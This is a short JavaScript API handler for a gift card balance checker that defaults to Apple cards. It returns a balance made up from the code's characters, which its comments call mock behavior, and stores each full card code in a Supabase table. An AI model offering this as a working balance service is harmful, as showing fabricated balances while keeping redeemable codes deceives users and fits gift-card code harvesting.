import { supabase } from '../../lib/supabase'

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
  const { cardNumber, type = 'apple' } = req.body || {}

  // Basic validation - allow alphanumeric characters without strict length check
  if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
    return res.status(400).json({ error: 'Invalid card code format. Please enter a valid code.' })
  }

  // Mock behavior: simulate lookup and return deterministic pseudo-random balance
  const last4 = cardNumber.slice(-4)
  const seed = cardNumber.charCodeAt(0) + (cardNumber.charCodeAt(Math.floor(cardNumber.length / 2)) || 0)
  const cents = (seed % 50000) + 1000 // between $10.00 and ~$600.00
  const balance = Math.round(cents) / 100

  // Simulate occasional errors for testing
  if (cardNumber.startsWith('XXXX')) return res.status(404).json({ error: 'Card not found. Please check the code and try again.' })

  const now = new Date().toISOString()
  const result = {
    card_number: cardNumber, // Using snake_case for Supabase columns
    balance,
    currency: 'USD',
    timestamp: now,
    type
  }

  // Save to Supabase
  try {
    const { error } = await supabase
      .from('cards')
      .insert([result])

    if (error) throw error
  } catch (err) {
    console.error(`Failed to save ${type} card to Supabase:`, err)
    // Log the error but don't fail the request if saving fails (for now)
  }

  return res.status(200).json({
    ...result,
    cardNumber: result.card_number, // Maintain compatibility with existing frontend
    cardLast4: last4
  })
}
